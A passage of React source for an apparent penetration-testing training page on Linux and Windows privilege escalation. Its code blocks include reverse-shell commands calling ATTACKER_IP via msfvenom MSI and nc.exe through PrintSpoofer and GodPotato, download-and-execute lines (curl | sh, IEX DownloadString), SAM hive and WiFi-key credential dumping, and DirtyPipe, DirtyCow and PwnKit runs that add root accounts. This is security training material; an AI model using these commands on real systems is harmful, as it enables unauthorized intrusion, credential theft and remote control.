              {windowsTechniques.map((technique) => (
                <Accordion 
                  key={technique.technique}
                  sx={{ 
                    bgcolor: alpha("#1a1a2e", 0.8), 
                    mb: 1,
                    "&:before": { display: "none" },
                    border: `1px solid ${alpha("#3b82f6", 0.2)}`,
                    borderRadius: "8px !important",
                  }}
                >
                  <AccordionSummary expandIcon={<ExpandMoreIcon sx={{ color: "#3b82f6" }} />}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 2, width: "100%" }}>
                      <Typography sx={{ color: "white", fontWeight: 600, flex: 1 }}>{technique.technique}</Typography>
                      <Chip 
                        label={technique.difficulty} 
                        size="small" 
                        sx={{ 
                          bgcolor: alpha(
                            technique.difficulty === "Easy" ? "#22c55e" : 
                            technique.difficulty === "Medium" ? "#f59e0b" : "#ef4444", 0.2
                          ),
                          color: technique.difficulty === "Easy" ? "#22c55e" : 
                                 technique.difficulty === "Medium" ? "#f59e0b" : "#ef4444",
                        }} 
                      />
                    </Box>
                  </AccordionSummary>
                  <AccordionDetails>
                    <Typography variant="body2" sx={{ color: "grey.300", mb: 2 }}>
                      {technique.howItWorks}
                    </Typography>
                    
                    <Typography variant="subtitle2" sx={{ color: "#3b82f6", mb: 1, fontWeight: 600 }}>
                      Detection Command:
                    </Typography>
                    <Box sx={{ bgcolor: "#0d1117", p: 1.5, borderRadius: 1, mb: 2, fontFamily: "monospace", fontSize: "0.8rem", color: "#c9d1d9", whiteSpace: "pre-wrap" }}>
                      {technique.detection}
                    </Box>
                    
                    <Typography variant="subtitle2" sx={{ color: "#3b82f6", mb: 1, fontWeight: 600 }}>
                      Exploitation Steps:
                    </Typography>
                    <List dense>
                      {technique.exploitation.map((step, idx) => (
                        <ListItem key={idx} sx={{ px: 0, py: 0.25 }}>
                          <ListItemIcon sx={{ minWidth: 28 }}>
                            <PlayArrowIcon sx={{ color: "#22c55e", fontSize: 16 }} />
                          </ListItemIcon>
                          <ListItemText 
                            primary={<Typography variant="body2" sx={{ color: "grey.300", fontFamily: step.includes(':') && !step.includes(':\\') ? "inherit" : "monospace", fontSize: "0.85rem" }}>{step}</Typography>}
                          />
                        </ListItem>
                      ))}
                    </List>
                    
                    <Box sx={{ mt: 2, display: "flex", gap: 1 }}>
                      <Chip label={`Tools: ${technique.tools}`} size="small" sx={{ bgcolor: alpha("#3b82f6", 0.2), color: "#3b82f6" }} />
                    </Box>
                  </AccordionDetails>
                </Accordion>
              ))}
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#3b82f6", mb: 2, fontWeight: 700 }}>
                Comprehensive Windows Enumeration Commands
              </Typography>
              
              <CodeBlock
                title="System Information"
                language="powershell"
                code={`# System info
systeminfo
hostname
whoami /all

# OS version
[System.Environment]::OSVersion
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer

# Installed patches
wmic qfe list
Get-HotFix

# Environment variables
set
Get-ChildItem Env:`}
              />

              <CodeBlock
                title="User & Privilege Enumeration"
                language="powershell"
                code={`# Current user privileges
whoami /priv
whoami /groups

# All users
net user
Get-LocalUser

# Administrators
net localgroup administrators

# Check for SeImpersonate
whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"

# Logged in users
query user
qwinsta`}
              />

              <CodeBlock
                title="Service Enumeration"
                language="powershell"
                code={`# All services with paths
wmic service get name,displayname,pathname,startmode

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """

# Service permissions (requires accesschk from Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv "Everyone" *

# Service configuration
sc qc servicename

# PowerShell service enum
Get-Service | Where-Object {$_.Status -eq "Running"}`}
              />

              <CodeBlock
                title="Scheduled Tasks"
                language="powershell"
                code={`# List all scheduled tasks
schtasks /query /fo LIST /v

# PowerShell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName, TaskPath, State

# Check task file permissions
icacls "C:\\path\\to\\task\\binary.exe"

# Autoruns
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce`}
              />

              <CodeBlock
                title="Network Enumeration"
                language="powershell"
                code={`# IP configuration
ipconfig /all

# Routing table
route print

# ARP cache
arp -a

# Open ports
netstat -ano
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}

# Firewall rules
netsh advfirewall firewall show rule name=all

# Shares
net share
Get-SmbShare`}
              />

              <CodeBlock
                title="Credential Hunting"
                language="powershell"
                code={`# Saved credentials
cmdkey /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

# SAM and SYSTEM (requires admin)
reg save HKLM\\SAM sam.hive
reg save HKLM\\SYSTEM system.hive

# Search for passwords in files
findstr /si password *.txt *.ini *.config *.xml
Get-ChildItem -Recurse -Include *.txt,*.ini,*.config,*.xml | Select-String "password"

# Unattend files
Get-ChildItem C:\\ -Recurse -Include *unattend*,*sysprep* 2>$null`}
              />

              <CodeBlock
                title="AlwaysInstallElevated Check"
                language="powershell"
                code={`# Check registry keys (both must be 1)
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# If both are 1, generate malicious MSI:
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > shell.msi

# Execute on target:
msiexec /quiet /qn /i C:\\path\\to\\shell.msi`}
              />
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Alert severity="info" sx={{ bgcolor: alpha("#3b82f6", 0.1) }}>
              <Typography variant="body2">
                <strong>Pro Tip:</strong> Run WinPEAS.exe for comprehensive enumeration. For token impersonation, 
                check for SeImpersonatePrivilege first, then choose the right Potato variant for your Windows version.
                PrintSpoofer works on newer systems, while JuicyPotato works on older ones.
              </Typography>
            </Alert>
          </Grid>
        </Grid>
      </TabPanel>

      {/* Tab 3: Enumeration */}
      <TabPanel value={tabValue} index={3}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Enumeration Methodology
              </Typography>
              <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
                Thorough enumeration is key to finding privilege escalation vectors. Always check these areas systematically.
              </Typography>

              <Alert severity="info" sx={{ mb: 3, bgcolor: alpha("#3b82f6", 0.1) }}>
                <Typography variant="body2">
                  <strong>Enumeration Flow:</strong> System info → Users & Groups → Network → Running processes → 
                  Scheduled tasks → Services → File permissions → Installed software → Credentials
                </Typography>
              </Alert>

              {/* Enumeration Checklist Cards */}
              <Grid container spacing={2} sx={{ mb: 4 }}>
                {enumerationChecklist.map((category) => (
                  <Grid item xs={12} md={6} lg={4} key={category.category}>
                    <Card sx={{ bgcolor: alpha("#1a1a2e", 0.8), border: `1px solid ${alpha("#ef4444", 0.2)}`, height: "100%" }}>
                      <CardContent>
                        <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                          {React.cloneElement(category.icon, { sx: { color: "#ef4444" } })}
                          <Typography variant="h6" sx={{ color: "#ef4444", fontWeight: 700, fontSize: "1rem" }}>
                            {category.category}
                          </Typography>
                        </Box>
                        <List dense>
                          {category.items.map((item) => (
                            <ListItem key={item} sx={{ px: 0, py: 0.25 }}>
                              <ListItemIcon sx={{ minWidth: 24 }}>
                                <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 14 }} />
                              </ListItemIcon>
                              <ListItemText 
                                primary={<Typography variant="body2" sx={{ color: "grey.300", fontSize: "0.85rem" }}>{item}</Typography>}
                              />
                            </ListItem>
                          ))}
                        </List>
                      </CardContent>
                    </Card>
                  </Grid>
                ))}
              </Grid>
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#f59e0b", mb: 2, fontWeight: 700 }}>
                Linux Automated Enumeration
              </Typography>

              <CodeBlock
                title="LinPEAS - Most Comprehensive"
                language="bash"
                code={`# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Save output to file
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee linpeas_output.txt

# Run from local file
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee output.txt`}
              />

              <CodeBlock
                title="LinEnum"
                language="bash"
                code={`# Download
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Run with thorough tests
chmod +x LinEnum.sh
./LinEnum.sh -t`}
              />

              <CodeBlock
                title="linux-exploit-suggester"
                language="bash"
                code={`# Download and run
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Alternative - linux-exploit-suggester-2
./les2.pl`}
              />

              <CodeBlock
                title="pspy - Process Monitoring"
                language="bash"
                code={`# Download from releases
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

chmod +x pspy64
./pspy64 -pf -i 1000

# Watch for cron jobs, processes, etc.`}
              />
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#3b82f6", mb: 2, fontWeight: 700 }}>
                Windows Automated Enumeration
              </Typography>

              <CodeBlock
                title="WinPEAS"
                language="powershell"
                code={`# Download executable
certutil -urlcache -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe winpeas.exe

# Run
.\\winpeas.exe

# Or use PowerShell version
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')`}
              />

              <CodeBlock
                title="PowerUp (PowerSploit)"
                language="powershell"
                code={`# Import module
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-UnattendedInstallFile
Get-ModifiableRegistryAutoRun`}
              />

              <CodeBlock
                title="Windows Exploit Suggester"
                language="powershell"
                code={`# On target - export systeminfo
systeminfo > sysinfo.txt

# On attacker machine
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# WES-NG (newer version)
python wes.py sysinfo.txt`}
              />

              <CodeBlock
                title="Seatbelt"
                language="powershell"
                code={`# Seatbelt - comprehensive enum
Seatbelt.exe -group=all

# Specific groups
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=misc`}
              />
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Manual Enumeration Checklist
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" sx={{ color: "#f59e0b", mb: 1 }}>Linux</Typography>
                  <List dense>
                    {[
                      "Check sudo -l for easy wins",
                      "Look for SUID/SGID binaries",
                      "Check capabilities (getcap)",
                      "Review cron jobs for writable scripts",
                      "Search for credentials in config files",
                      "Check NFS exports for no_root_squash",
                      "Look for docker/lxd group membership",
                      "Check for writable /etc/passwd",
                      "Review running processes as root",
                      "Check kernel version for exploits"
                    ].map((item) => (
                      <ListItem key={item} sx={{ px: 0, py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <CheckCircleIcon sx={{ color: "#f59e0b", fontSize: 14 }} />
                        </ListItemIcon>
                        <ListItemText primary={<Typography variant="body2" sx={{ color: "grey.300" }}>{item}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="subtitle2" sx={{ color: "#3b82f6", mb: 1 }}>Windows</Typography>
                  <List dense>
                    {[
                      "Check whoami /priv for SeImpersonate",
                      "Look for unquoted service paths",
                      "Check service binary permissions",
                      "Review scheduled tasks",
                      "Check AlwaysInstallElevated",
                      "Look for saved credentials (cmdkey)",
                      "Review autorun registry keys",
                      "Check for missing DLLs (Process Monitor)",
                      "Review installed patches for exploits",
                      "Search for passwords in files/registry"
                    ].map((item) => (
                      <ListItem key={item} sx={{ px: 0, py: 0.25 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <CheckCircleIcon sx={{ color: "#3b82f6", fontSize: 14 }} />
                        </ListItemIcon>
                        <ListItemText primary={<Typography variant="body2" sx={{ color: "grey.300" }}>{item}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
              </Grid>
            </Paper>
          </Grid>
        </Grid>
      </TabPanel>

      {/* Tab 4: Kernel Exploits */}
      <TabPanel value={tabValue} index={4}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Kernel Exploits
              </Typography>
              <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
                Kernel exploits target vulnerabilities in the operating system kernel for direct privilege escalation.
                They are powerful but can crash the system if used incorrectly.
              </Typography>

              <Alert severity="error" sx={{ mb: 3, bgcolor: alpha("#ef4444", 0.1) }}>
                <Typography variant="body2">
                  <strong>Warning:</strong> Kernel exploits can cause system instability, crashes, or data corruption. 
                  Always have a backup plan and test in a lab environment first. Use as a last resort after checking for misconfigurations.
                </Typography>
              </Alert>

              {/* Common Kernel Exploits Table */}
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Notable Linux Kernel Exploits
              </Typography>
              <TableContainer sx={{ mb: 4 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Name</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>CVE</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Affected Kernels</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Description</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Difficulty</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {kernelExploits.map((exploit) => (
                      <TableRow key={exploit.cve}>
                        <TableCell sx={{ color: "white", fontWeight: 600 }}>{exploit.name}</TableCell>
                        <TableCell sx={{ color: "#3b82f6", fontFamily: "monospace" }}>{exploit.cve}</TableCell>
                        <TableCell sx={{ color: "grey.300", fontFamily: "monospace", fontSize: "0.8rem" }}>{exploit.kernel}</TableCell>
                        <TableCell sx={{ color: "grey.300" }}>{exploit.description}</TableCell>
                        <TableCell>
                          <Chip 
                            label={exploit.difficulty} 
                            size="small" 
                            sx={{ 
                              bgcolor: alpha(
                                exploit.difficulty === "Easy" ? "#22c55e" : 
                                exploit.difficulty === "Medium" ? "#f59e0b" : "#ef4444", 0.2
                              ),
                              color: exploit.difficulty === "Easy" ? "#22c55e" : 
                                     exploit.difficulty === "Medium" ? "#f59e0b" : "#ef4444",
                            }} 
                          />
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#f59e0b", mb: 2, fontWeight: 700 }}>
                Linux Kernel Exploit Workflow
              </Typography>

              <CodeBlock
                title="1. Identify Kernel Version"
                language="bash"
                code={`# Get kernel version
uname -r
uname -a
cat /proc/version

# Example output: 5.4.0-42-generic`}
              />

              <CodeBlock
                title="2. Run Exploit Suggester"
                language="bash"
                code={`# linux-exploit-suggester
./linux-exploit-suggester.sh

# Alternative - LES2
./les.sh

# Search by kernel version
searchsploit linux kernel 5.4
searchsploit linux kernel ubuntu`}
              />

              <CodeBlock
                title="3. PwnKit (CVE-2021-4034)"
                language="bash"
                code={`# Easy to use - works on most Linux with pkexec
git clone https://github.com/ly4k/PwnKit
cd PwnKit
chmod +x PwnKit
./PwnKit

# Or compile from source
curl https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.c -o pwnkit.c
gcc pwnkit.c -o pwnkit
./pwnkit`}
              />

              <CodeBlock
                title="4. DirtyPipe (CVE-2022-0847)"
                language="bash"
                code={`# Works on kernel 5.8 - 5.16.11
git clone https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
cd CVE-2022-0847-DirtyPipe-Exploit
bash compile.sh

# Run exploit
./exploit /etc/passwd 1 "\\n\\nroot2::\\$1\\$root2:\\$xyz:0:0:root:/root:/bin/bash"

# Then switch to root2
su root2`}
              />

              <CodeBlock
                title="5. DirtyCow (CVE-2016-5195)"
                language="bash"
                code={`# Works on kernel 2.6.22 - 4.8.3
# Multiple variants available

# Variant 1: Write to read-only files
git clone https://github.com/dirtycow/dirtycow.github.io
cd dirtycow.github.io
gcc -pthread dirty.c -o dirty -lcrypt
./dirty new_password

# Variant 2: firefart - modifies /etc/passwd
gcc -pthread dirtyc0w.c -o dirty -lcrypt
./dirty`}
              />
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#3b82f6", mb: 2, fontWeight: 700 }}>
                Windows Kernel Exploit Workflow
              </Typography>

              <CodeBlock
                title="1. Gather System Information"
                language="powershell"
                code={`# Get detailed system info
systeminfo > sysinfo.txt

# Check patches
wmic qfe list

# Check OS version
[System.Environment]::OSVersion`}
              />

              <CodeBlock
                title="2. Run Windows Exploit Suggester"
                language="powershell"
                code={`# On attacker machine with sysinfo.txt
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt

# WES-NG (newer, maintained)
python wes.py sysinfo.txt -i 'Elevation of Privilege' -e`}
              />

              <CodeBlock
                title="3. Token Impersonation (Most Common)"
                language="powershell"
                code={`# Check for SeImpersonate
whoami /priv

# PrintSpoofer (Windows 10/Server 2016-2019)
PrintSpoofer64.exe -i -c "cmd"
PrintSpoofer64.exe -c "C:\\path\\to\\nc.exe ATTACKER_IP 4444 -e cmd"

# GodPotato (Windows Server 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\\path\\to\\nc.exe ATTACKER_IP 4444 -e cmd"

# JuicyPotato (older systems)
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a "/c whoami" -t *`}
              />

              <CodeBlock
                title="4. Common Windows Kernel CVEs"
                language="powershell"
                code={`# MS17-010 (EternalBlue) - SMBv1
# MS16-032 - Secondary Logon Service
# MS15-051 - Win32k.sys
# MS14-058 - Kernel Mode Driver
# CVE-2021-1732 - Win32k Elevation of Privilege

# Use precompiled exploits from:
# https://github.com/SecWiki/windows-kernel-exploits`}
              />

              <CodeBlock
                title="5. Cross-Compile Exploits"
                language="bash"
                code={`# On Linux, compile Windows exploits
# Install mingw
apt install mingw-w64

# Compile 64-bit
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe

# Compile 32-bit
i686-w64-mingw32-gcc exploit.c -o exploit.exe

# Transfer to target
python3 -m http.server 80`}
              />
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Alert severity="warning" sx={{ bgcolor: alpha("#f59e0b", 0.1) }}>
              <Typography variant="body2">
                <strong>Best Practice:</strong> Always try misconfigurations first (sudo, SUID, services, etc.) before 
                attempting kernel exploits. Kernel exploits are a last resort due to stability risks. 
                Document your attempts and have the client's emergency contact ready.
              </Typography>
            </Alert>
          </Grid>
        </Grid>
      </TabPanel>

      {/* Tab 5: Tools */}
      <TabPanel value={tabValue} index={5}>
        <Grid container spacing={3}>
          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h5" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Essential Privilege Escalation Tools
              </Typography>
              <Typography variant="body2" sx={{ color: "grey.400", mb: 3 }}>
                These tools automate the enumeration process and help identify privilege escalation vectors quickly.
              </Typography>

              <TableContainer sx={{ mb: 4 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Tool</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Platform</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Description</TableCell>
                      <TableCell sx={{ color: "#ef4444", fontWeight: 700 }}>Usage</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {essentialTools.map((tool) => (
                      <TableRow key={tool.name}>
                        <TableCell>
                          <Button href={tool.url} target="_blank" sx={{ color: "white", textTransform: "none", p: 0, minWidth: 0, fontWeight: 600 }}>
                            {tool.name}
                          </Button>
                        </TableCell>
                        <TableCell>
                          <Chip 
                            label={tool.platform} 
                            size="small" 
                            sx={{ 
                              bgcolor: alpha(
                                tool.platform === "Linux" ? "#f59e0b" : 
                                tool.platform === "Windows" ? "#3b82f6" : "#22c55e", 0.2
                              ),
                              color: tool.platform === "Linux" ? "#f59e0b" : 
                                     tool.platform === "Windows" ? "#3b82f6" : "#22c55e",
                            }} 
                          />
                        </TableCell>
                        <TableCell sx={{ color: "grey.300", maxWidth: 300 }}>{tool.description}</TableCell>
                        <TableCell sx={{ color: "grey.400", fontFamily: "monospace", fontSize: "0.75rem", maxWidth: 200 }}>{tool.usage}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </Paper>
          </Grid>

          {/* Tool Categories */}
          <Grid item xs={12} md={4}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                <TerminalIcon sx={{ color: "#f59e0b" }} />
                <Typography variant="h6" sx={{ color: "#f59e0b", fontWeight: 700 }}>
                  Enumeration Scripts
                </Typography>
              </Box>
              <List dense>
                {[
                  { name: "LinPEAS", desc: "Most comprehensive Linux enum" },
                  { name: "WinPEAS", desc: "Most comprehensive Windows enum" },
                  { name: "LinEnum", desc: "Quick Linux enumeration" },
                  { name: "PowerUp", desc: "Windows service/DLL checks" },
                  { name: "Seatbelt", desc: ".NET Windows security audit" },
                  { name: "pspy", desc: "Linux process monitoring" },
                ].map((tool) => (
                  <ListItem key={tool.name} sx={{ px: 0, py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ color: "#f59e0b", fontSize: 16 }} />
                    </ListItemIcon>
                    <ListItemText 
                      primary={<Typography variant="body2" sx={{ color: "white", fontWeight: 600 }}>{tool.name}</Typography>}
                      secondary={<Typography variant="caption" sx={{ color: "grey.400" }}>{tool.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12} md={4}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                <BugReportIcon sx={{ color: "#ef4444" }} />
                <Typography variant="h6" sx={{ color: "#ef4444", fontWeight: 700 }}>
                  Exploit Suggesters
                </Typography>
              </Box>
              <List dense>
                {[
                  { name: "linux-exploit-suggester", desc: "Linux kernel CVE finder" },
                  { name: "les2", desc: "Linux exploit suggester v2" },
                  { name: "Windows Exploit Suggester", desc: "Windows patch analysis" },
                  { name: "WES-NG", desc: "Next gen Windows suggester" },
                  { name: "Sherlock", desc: "PowerShell exploit finder" },
                ].map((tool) => (
                  <ListItem key={tool.name} sx={{ px: 0, py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ color: "#ef4444", fontSize: 16 }} />
                    </ListItemIcon>
                    <ListItemText 
                      primary={<Typography variant="body2" sx={{ color: "white", fontWeight: 600 }}>{tool.name}</Typography>}
                      secondary={<Typography variant="caption" sx={{ color: "grey.400" }}>{tool.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12} md={4}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 2 }}>
                <AdminPanelSettingsIcon sx={{ color: "#22c55e" }} />
                <Typography variant="h6" sx={{ color: "#22c55e", fontWeight: 700 }}>
                  Token/Potato Tools
                </Typography>
              </Box>
              <List dense>
                {[
                  { name: "PrintSpoofer", desc: "Win10/Server 2016+ token abuse" },
                  { name: "GodPotato", desc: "Latest potato - Server 2012-2022" },
                  { name: "JuicyPotato", desc: "Older Windows token impersonation" },
                  { name: "RoguePotato", desc: "Alternative potato exploit" },
                  { name: "SweetPotato", desc: "Collection of potato exploits" },
                  { name: "SharpEfsPotato", desc: "EFS-based token impersonation" },
                ].map((tool) => (
                  <ListItem key={tool.name} sx={{ px: 0, py: 0.5 }}>
                    <ListItemIcon sx={{ minWidth: 28 }}>
                      <CheckCircleIcon sx={{ color: "#22c55e", fontSize: 16 }} />
                    </ListItemIcon>
                    <ListItemText 
                      primary={<Typography variant="body2" sx={{ color: "white", fontWeight: 600 }}>{tool.name}</Typography>}
                      secondary={<Typography variant="caption" sx={{ color: "grey.400" }}>{tool.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2 }}>
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                Tool Transfer Methods
              </Typography>
              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <CodeBlock
                    title="Linux File Transfer"
                    language="bash"
                    code={`# On attacker - start HTTP server
python3 -m http.server 80

# On target - download tools
wget http://ATTACKER_IP/linpeas.sh
curl http://ATTACKER_IP/linpeas.sh -o linpeas.sh

# Base64 encode/decode (no network)
# Attacker: base64 linpeas.sh | tr -d '\\n'
# Target: echo "BASE64_STRING" | base64 -d > linpeas.sh

# SCP (if you have creds)
scp user@attacker:/tools/linpeas.sh .`}
                  />
                </Grid>
                <Grid item xs={12} md={6}>
                  <CodeBlock
                    title="Windows File Transfer"
                    language="powershell"
                    code={`# PowerShell download
IWR -Uri "http://ATTACKER_IP/winpeas.exe" -OutFile "winpeas.exe"
Invoke-WebRequest "http://ATTACKER_IP/winpeas.exe" -OutFile "winpeas.exe"

# Certutil
certutil -urlcache -f http://ATTACKER_IP/winpeas.exe winpeas.exe

# BitsAdmin
bitsadmin /transfer job /download /priority high http://ATTACKER_IP/winpeas.exe C:\\Temp\\winpeas.exe

# SMB share (from attacker)
copy \\\\ATTACKER_IP\\share\\winpeas.exe .`}
                  />
                </Grid>
              </Grid>
            </Paper>
          </Grid>
        </Grid>
      </TabPanel>

      {/* Tab 6: Resources */}
      <TabPanel value={tabValue} index={6}>
        <Grid container spacing={3}>
          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#ef4444", mb: 2, fontWeight: 700 }}>
                📚 Essential Documentation
              </Typography>
              <List>
                {[
                  { name: "GTFOBins", url: "https://gtfobins.github.io/", desc: "Unix binaries for privilege escalation - SUID, sudo, capabilities" },
                  { name: "LOLBAS", url: "https://lolbas-project.github.io/", desc: "Living Off The Land Binaries (Windows) - signed Microsoft binaries for attacks" },
                  { name: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", desc: "Comprehensive privesc payloads and techniques" },
                  { name: "HackTricks", url: "https://book.hacktricks.xyz/", desc: "Extensive pentesting documentation - Linux & Windows privesc chapters" },
                  { name: "PEASS-ng Wiki", url: "https://github.com/carlospolop/PEASS-ng/wiki", desc: "Understanding PEASS output and findings" },
                  { name: "Sushant747 Total OSCP Guide", url: "https://sushant747.gitbooks.io/total-oscp-guide/", desc: "Privilege escalation for OSCP" },
                ].map((resource) => (
                  <ListItem key={resource.name} sx={{ px: 0 }}>
                    <ListItemIcon>
                      <CheckCircleIcon sx={{ color: "#ef4444" }} />
                    </ListItemIcon>
                    <ListItemText
                      primary={<Button href={resource.url} target="_blank" sx={{ color: "white", textTransform: "none", p: 0, minWidth: 0, fontWeight: 600 }}>{resource.name}</Button>}
                      secondary={<Typography variant="body2" sx={{ color: "grey.400" }}>{resource.desc}</Typography>}
                    />
                  </ListItem>
                ))}
              </List>
            </Paper>
          </Grid>

          <Grid item xs={12} md={6}>
            <Paper sx={{ p: 3, bgcolor: "#111118", borderRadius: 2, height: "100%" }}>
              <Typography variant="h6" sx={{ color: "#f59e0b", mb: 2, fontWeight: 700 }}>
                🎯 Practice Platforms
              </Typography>
              <List>
                {[
